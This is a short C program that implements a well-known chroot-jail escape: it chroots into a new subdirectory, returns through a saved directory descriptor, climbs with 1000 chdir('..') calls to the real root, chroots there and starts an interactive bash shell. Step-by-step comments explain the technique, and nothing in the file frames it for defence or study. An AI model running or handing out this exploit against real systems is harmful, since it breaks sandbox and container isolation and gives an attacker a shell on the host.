#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
    int fd_we_need, x;
    setuid(0); // In case we change uid
    mkdir(".subchroot", 0755); // Our subdirectory in which we are going to chroot
    fd_we_need = open(".", O_RDONLY); //The fd of the current directory
    chroot(".subchroot");
    fchdir(fd_we_need); // Change the working directory using fd
    close(fd_we_need);
    for(x = 0; x < 1000; x++) chdir(".."); // Goes up one directory 1000 times
    //Similar to chroot("../../../........");
    chroot(".");
    return execl("/bin/bash", "-i", NULL);
}

